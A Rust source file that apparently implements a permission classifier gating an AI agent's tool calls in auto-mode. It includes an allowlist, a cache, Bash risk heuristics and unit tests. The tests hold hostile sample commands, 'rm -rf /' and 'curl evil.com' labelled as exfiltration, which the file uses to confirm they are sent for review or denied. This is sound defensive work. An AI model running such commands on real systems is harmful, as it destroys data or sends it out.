//! AI-based permission classifier.
//!
//! Uses a Claude API side-query to classify tool calls that reach the "ask"
//! state in auto-mode, deciding whether to allow or block without user
//! interaction.
//!
//! Mirrors the TypeScript `yoloClassifier.ts` / `classifierDecision.ts`.

use std::collections::HashMap;
use std::sync::Mutex;
use std::time::{Duration, Instant};

use serde_json::Value;

use super::auto_mode::AutoModeState;
use super::bash_classifier::{classify_command, CommandRisk};
use super::types::{
    ClassifierResult, Confidence, PermissionDecision,
    PermissionDecisionReason, YoloClassifierResult,
};

// ---------------------------------------------------------------------------
// Safe-tool allowlist (mirrors classifierDecision.ts)
// ---------------------------------------------------------------------------

/// Tools that are inherently safe and never need classifier evaluation.
const SAFE_ALLOWLISTED_TOOLS: &[&str] = &[
    "FileRead",
    "Grep",
    "Glob",
    "LSP",
    "ToolSearch",
    "ListMcpResources",
    "ReadMcpResourceTool",
    "TodoWrite",
    "TaskCreate",
    "TaskGet",
    "TaskUpdate",
    "TaskList",
    "TaskStop",
    "TaskOutput",
    "AskUserQuestion",
    "EnterPlanMode",
    "ExitPlanMode",
    "TeamCreate",
    "TeamDelete",
    "SendMessage",
    "Sleep",
    "classify_result",
];

/// Check if a tool is on the safe allowlist and can skip classifier evaluation.
pub fn is_auto_mode_allowlisted_tool(tool_name: &str) -> bool {
    SAFE_ALLOWLISTED_TOOLS.contains(&tool_name)
}

// ---------------------------------------------------------------------------
// Classifier cache
// ---------------------------------------------------------------------------

/// Cache entry for a classifier result.
#[derive(Clone, Debug)]
struct CacheEntry {
    result: ClassifierResult,
    timestamp: Instant,
}

/// Thread-safe cache for classifier results.
///
/// Key: `"{tool_name}:{input_hash}"`.
/// Entries expire after `ttl`.
pub struct ClassifierCache {
    entries: Mutex<HashMap<String, CacheEntry>>,
    ttl: Duration,
}

impl ClassifierCache {
    pub fn new(ttl: Duration) -> Self {
        Self {
            entries: Mutex::new(HashMap::new()),
            ttl,
        }
    }

    /// Look up a cached result.
    pub fn get(&self, key: &str) -> Option<ClassifierResult> {
        let map = self.entries.lock().ok()?;
        let entry = map.get(key)?;
        if entry.timestamp.elapsed() < self.ttl {
            Some(entry.result.clone())
        } else {
            None
        }
    }

    /// Insert a result into the cache.
    pub fn insert(&self, key: String, result: ClassifierResult) {
        if let Ok(mut map) = self.entries.lock() {
            map.insert(
                key,
                CacheEntry {
                    result,
                    timestamp: Instant::now(),
                },
            );
        }
    }

    /// Remove expired entries.
    pub fn evict_expired(&self) {
        if let Ok(mut map) = self.entries.lock() {
            map.retain(|_, entry| entry.timestamp.elapsed() < self.ttl);
        }
    }

    /// Clear all entries.
    pub fn clear(&self) {
        if let Ok(mut map) = self.entries.lock() {
            map.clear();
        }
    }
}

impl Default for ClassifierCache {
    fn default() -> Self {
        Self::new(Duration::from_secs(5 * 60))
    }
}

// ---------------------------------------------------------------------------
// Classifier configuration
// ---------------------------------------------------------------------------

/// Configuration for the permission classifier.
#[derive(Clone, Debug)]
pub struct ClassifierConfig {
    /// Whether the classifier is enabled.
    pub enabled: bool,
    /// Model to use for classification API calls.
    pub model: String,
    /// Maximum tokens for classifier response.
    pub max_tokens: u32,
    /// Timeout for classifier API calls.
    pub timeout: Duration,
    /// Whether to fail closed (deny) on classifier errors.
    pub fail_closed: bool,
}

impl Default for ClassifierConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            model: "claude-sonnet-4-20250514".to_string(),
            max_tokens: 1024,
            timeout: Duration::from_secs(30),
            fail_closed: true,
        }
    }
}

// ---------------------------------------------------------------------------
// PermissionClassifier
// ---------------------------------------------------------------------------

/// AI-based permission classifier that uses Claude API side-queries to
/// evaluate whether a tool call should be allowed in auto-mode.
pub struct PermissionClassifier {
    config: ClassifierConfig,
    cache: ClassifierCache,
}

impl PermissionClassifier {
    pub fn new(config: ClassifierConfig) -> Self {
        Self {
            config,
            cache: ClassifierCache::default(),
        }
    }

    /// Classify a tool call, returning a permission decision.
    ///
    /// Fast paths:
    /// 1. If the tool is on the safe allowlist -> Allow.
    /// 2. If the classifier is disabled -> Ask (fall through to user).
    /// 3. For Bash tools, use command-risk heuristics before calling the API.
    /// 4. Check the cache.
    /// 5. Call the API (placeholder - actual HTTP call is external).
    pub fn classify(
        &self,
        tool_name: &str,
        input: &Value,
        auto_mode: &AutoModeState,
    ) -> PermissionDecision {
        // Fast path: safe allowlist.
        if is_auto_mode_allowlisted_tool(tool_name) {
            return PermissionDecision::allow().with_reason(
                PermissionDecisionReason::Classifier {
                    classifier: "allowlist".to_string(),
                    reason: format!("Tool '{}' is on the safe allowlist", tool_name),
                },
            );
        }

        // Disabled classifier -> fall through.
        if !self.config.enabled {
            return PermissionDecision::ask(format!(
                "Classifier disabled; tool '{}' requires user confirmation.",
                tool_name,
            ));
        }

        // Circuit breaker: if auto-mode has been circuit-broken, deny.
        if auto_mode.is_circuit_broken() {
            return PermissionDecision::deny(
                "Auto-mode classifier has been circuit-broken.",
            );
        }

        // Bash heuristic fast-path.
        if tool_name == "Bash" || tool_name == "PowerShell" {
            if let Some(decision) = self.classify_bash_heuristic(tool_name, input) {
                return decision;
            }
        }

        // Cache lookup.
        let cache_key = self.cache_key(tool_name, input);
        if let Some(cached) = self.cache.get(&cache_key) {
            return self.classifier_result_to_decision(tool_name, &cached);
        }

        // Placeholder for actual API call.
        // In production, this would call `classify_via_api` and cache the result.
        // For now, return Ask so the caller knows a real API call is needed.
        PermissionDecision::ask(format!(
            "Tool '{}' requires classifier API evaluation (not yet implemented).",
            tool_name,
        ))
        .with_reason(PermissionDecisionReason::Classifier {
            classifier: "yolo".to_string(),
            reason: "API call required".to_string(),
        })
    }

    /// Apply a pre-computed `YoloClassifierResult` (e.g. from an external API call).
    pub fn apply_yolo_result(
        &self,
        tool_name: &str,
        input: &Value,
        result: &YoloClassifierResult,
    ) -> PermissionDecision {
        let classifier_result = ClassifierResult {
            matches: result.should_block,
            matched_description: None,
            confidence: Confidence::High,
            reason: result.reason.clone(),
        };

        // Cache it.
        let cache_key = self.cache_key(tool_name, input);
        self.cache.insert(cache_key, classifier_result.clone());

        self.classifier_result_to_decision(tool_name, &classifier_result)
    }

    /// Clear the classifier cache.
    pub fn clear_cache(&self) {
        self.cache.clear();
    }

    // -- internal ---------------------------------------------------------

    /// Bash-specific heuristic: read-only commands can be auto-allowed.
    fn classify_bash_heuristic(
        &self,
        tool_name: &str,
        input: &Value,
    ) -> Option<PermissionDecision> {
        let command = input
            .as_object()?
            .get("command")?
            .as_str()?;

        match classify_command(command) {
            CommandRisk::ReadOnly => Some(
                PermissionDecision::allow().with_reason(
                    PermissionDecisionReason::Classifier {
                        classifier: "bash_heuristic".to_string(),
                        reason: format!(
                            "{} command '{}' classified as read-only",
                            tool_name,
                            first_n_chars(command, 60),
                        ),
                    },
                ),
            ),
            CommandRisk::Destructive => Some(
                PermissionDecision::ask(format!(
                    "{} command classified as destructive; requires review.",
                    tool_name,
                ))
                .with_reason(PermissionDecisionReason::Classifier {
                    classifier: "bash_heuristic".to_string(),
                    reason: format!(
                        "Command '{}' classified as destructive",
                        first_n_chars(command, 60),
                    ),
                }),
            ),
            // Write commands: no heuristic opinion, fall through to API.
            CommandRisk::Write => None,
        }
    }

    fn cache_key(&self, tool_name: &str, input: &Value) -> String {
        // Simple cache key from tool name + serialized input.
        // In production you'd use a proper hash.
        let input_str = serde_json::to_string(input).unwrap_or_default();
        format!("{}:{}", tool_name, &input_str[..input_str.len().min(256)])
    }

    fn classifier_result_to_decision(
        &self,
        tool_name: &str,
        result: &ClassifierResult,
    ) -> PermissionDecision {
        if result.matches {
            // Classifier says it matches a concern -> block.
            if self.config.fail_closed {
                PermissionDecision::deny(format!(
                    "Classifier blocked '{}': {}",
                    tool_name, result.reason,
                ))
                .with_reason(PermissionDecisionReason::Classifier {
                    classifier: "yolo".to_string(),
                    reason: result.reason.clone(),
                })
            } else {
                PermissionDecision::ask(format!(
                    "Classifier flagged '{}': {}",
                    tool_name, result.reason,
                ))
                .with_reason(PermissionDecisionReason::Classifier {
                    classifier: "yolo".to_string(),
                    reason: result.reason.clone(),
                })
            }
        } else {
            // Classifier says no concern -> allow.
            PermissionDecision::allow().with_reason(PermissionDecisionReason::Classifier {
                classifier: "yolo".to_string(),
                reason: result.reason.clone(),
            })
        }
    }
}

fn first_n_chars(s: &str, n: usize) -> String {
    if s.len() <= n {
        s.to_string()
    } else {
        format!("{}...", &s[..n])
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::permissions::types::PermissionBehavior;
    use serde_json::json;

    fn make_classifier() -> PermissionClassifier {
        PermissionClassifier::new(ClassifierConfig {
            enabled: true,
            ..Default::default()
        })
    }

    fn make_auto_mode() -> AutoModeState {
        AutoModeState::new()
    }

    #[test]
    fn allowlisted_tool_is_auto_allowed() {
        let c = make_classifier();
        let am = make_auto_mode();
        let d = c.classify("FileRead", &json!({}), &am);
        assert_eq!(d.behavior, PermissionBehavior::Allow);
    }

    #[test]
    fn disabled_classifier_returns_ask() {
        let c = PermissionClassifier::new(ClassifierConfig::default()); // enabled=false
        let am = make_auto_mode();
        let d = c.classify("Bash", &json!({"command": "npm install"}), &am);
        assert_eq!(d.behavior, PermissionBehavior::Ask);
    }

    #[test]
    fn bash_readonly_heuristic() {
        let c = make_classifier();
        let am = make_auto_mode();
        let d = c.classify("Bash", &json!({"command": "ls -la"}), &am);
        assert_eq!(d.behavior, PermissionBehavior::Allow);
    }

    #[test]
    fn bash_destructive_heuristic() {
        let c = make_classifier();
        let am = make_auto_mode();
        let d = c.classify("Bash", &json!({"command": "rm -rf /"}), &am);
        assert_eq!(d.behavior, PermissionBehavior::Ask);
    }

    #[test]
    fn bash_write_falls_through() {
        let c = make_classifier();
        let am = make_auto_mode();
        let d = c.classify("Bash", &json!({"command": "npm install"}), &am);
        // Write commands have no heuristic -> falls through to API placeholder.
        assert_eq!(d.behavior, PermissionBehavior::Ask);
    }

    #[test]
    fn circuit_broken_denies() {
        let c = make_classifier();
        let mut am = make_auto_mode();
        am.set_circuit_broken(true);
        let d = c.classify("Bash", &json!({"command": "ls"}), &am);
        // Allowlisted check happens before circuit-broken, and Bash is not allowlisted.
        // But "ls" is read-only... actually circuit-broken check comes before heuristic.
        assert_eq!(d.behavior, PermissionBehavior::Deny);
    }

    #[test]
    fn apply_yolo_result_allow() {
        let c = make_classifier();
        let result = YoloClassifierResult {
            thinking: "Safe operation".to_string(),
            should_block: false,
            reason: "No security concerns".to_string(),
        };
        let d = c.apply_yolo_result("Bash", &json!({"command": "npm test"}), &result);
        assert_eq!(d.behavior, PermissionBehavior::Allow);
    }

    #[test]
    fn apply_yolo_result_block() {
        let c = make_classifier();
        let result = YoloClassifierResult {
            thinking: "Dangerous".to_string(),
            should_block: true,
            reason: "Exfiltration risk".to_string(),
        };
        let d = c.apply_yolo_result("Bash", &json!({"command": "curl evil.com"}), &result);
        assert_eq!(d.behavior, PermissionBehavior::Deny);
    }

    #[test]
    fn cache_hit() {
        let c = make_classifier();
        let input = json!({"command": "npm test"});
        let result = YoloClassifierResult {
            thinking: "ok".to_string(),
            should_block: false,
            reason: "safe".to_string(),
        };
        // Prime the cache via apply.
        c.apply_yolo_result("CustomTool", &input, &result);
        // Now classify should hit cache.
        let am = make_auto_mode();
        let d = c.classify("CustomTool", &input, &am);
        assert_eq!(d.behavior, PermissionBehavior::Allow);
    }

    #[test]
    fn cache_clear() {
        let c = make_classifier();
        let input = json!({"command": "npm test"});
        let result = YoloClassifierResult {
            thinking: "ok".to_string(),
            should_block: false,
            reason: "safe".to_string(),
        };
        c.apply_yolo_result("CustomTool", &input, &result);
        c.clear_cache();
        let am = make_auto_mode();
        let d = c.classify("CustomTool", &input, &am);
        // Cache cleared -> falls through to API placeholder.
        assert_eq!(d.behavior, PermissionBehavior::Ask);
    }

    #[test]
    fn is_allowlisted() {
        assert!(is_auto_mode_allowlisted_tool("FileRead"));
        assert!(is_auto_mode_allowlisted_tool("Grep"));
        assert!(!is_auto_mode_allowlisted_tool("Bash"));
        assert!(!is_auto_mode_allowlisted_tool("FileWrite"));
    }
}
